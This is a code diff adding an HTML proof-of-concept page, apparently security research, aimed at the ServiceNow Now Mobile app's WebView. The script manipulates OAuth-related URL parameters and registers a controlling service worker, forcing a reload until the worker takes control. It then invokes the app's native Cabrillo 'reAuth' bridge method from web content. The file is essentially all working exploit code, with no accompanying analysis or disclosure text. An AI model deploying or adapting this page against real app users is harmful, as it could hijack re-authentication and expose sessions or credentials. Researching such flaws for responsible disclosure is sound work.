@@ -1,0 +1,91 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Now Mobile security validation</title>
+  <style>
+    body { margin: 0; font: 16px/1.5 Arial, sans-serif; color: #172126; background: #f3f6f7; }
+    main { max-width: 620px; margin: 12vh auto; padding: 28px; background: white; border: 1px solid #d9e0e3; }
+    h1 { margin: 0 0 12px; font-size: 22px; }
+    #status { margin: 0; white-space: pre-wrap; overflow-wrap: anywhere; }
+  </style>
+</head>
+<body>
+<main>
+  <h1>Now Mobile security validation</h1>
+  <p id="status">Preparing controlled proof...</p>
+</main>
+<script>
+(async function () {
+  'use strict';
+
+  const status = document.getElementById('status');
+  const params = new URLSearchParams(location.search);
+  const tag = (params.get('tag') || 'SNOW').replace(/[^A-Za-z0-9_]/g, '').toUpperCase() || 'SNOW';
+  if (!params.has('oauth_initiator.do')) {
+    params.set('oauth_initiator.do', '1');
+  }
+  if (!/^[A-Z][A-Z0-9_]+$/.test(params.get('marker') || '')) {
+    const bytes = new Uint8Array(8);
+    crypto.getRandomValues(bytes);
+    params.set(
+      'marker',
+      tag + '_' + Array.from(bytes, value =>
+        value.toString(16).padStart(2, '0')).join('').toUpperCase()
+    );
+  }
+  params.set('proof', tag + '_MOBILE_REAUTH');
+  if (!params.has('diag')) {
+    params.set('diag', '1');
+  }
+  history.replaceState(null, '', location.pathname + '?' + params.toString());
+
+  if (!('serviceWorker' in navigator)) {
+    status.textContent = 'Service Worker is unavailable in this WebView.';
+    return;
+  }
+
+  try {
+    await navigator.serviceWorker.register('./sw.js?v=3', {
+      scope: './',
+      updateViaCache: 'none'
+    });
+    await navigator.serviceWorker.ready;
+
+    if (!navigator.serviceWorker.controller) {
+      await Promise.race([
+        new Promise(resolve => navigator.serviceWorker.addEventListener(
+          'controllerchange', resolve, { once: true }
+        )),
+        new Promise(resolve => setTimeout(resolve, 5000))
+      ]);
+    }
+
+    if (!navigator.serviceWorker.controller) {
+      if (params.get('sw_reload') !== '1') {
+        params.set('sw_reload', '1');
+        location.replace(location.pathname + '?' + params.toString());
+        return;
+      }
+      status.textContent = 'Service Worker did not take control.';
+      return;
+    }
+
+    const bridge = window.CabrilloClient;
+    const action = 'com.servicenow.cabrillo.nowapp.reAuth';
+    if (!bridge || typeof bridge.hasMethod !== 'function' ||
+        !bridge.hasMethod(action)) {
+      status.textContent = 'Cabrillo reAuth bridge is unavailable.';
+      return;
+    }
+
+    status.textContent = 'Invoking the controlled re-authentication proof...';
+    bridge.postMethod(action, JSON.stringify({ options: {} }));
+  } catch (error) {
+    status.textContent = 'Proof setup failed: ' + String(error);
+  }
+})();
+</script>
+</body>
+</html>
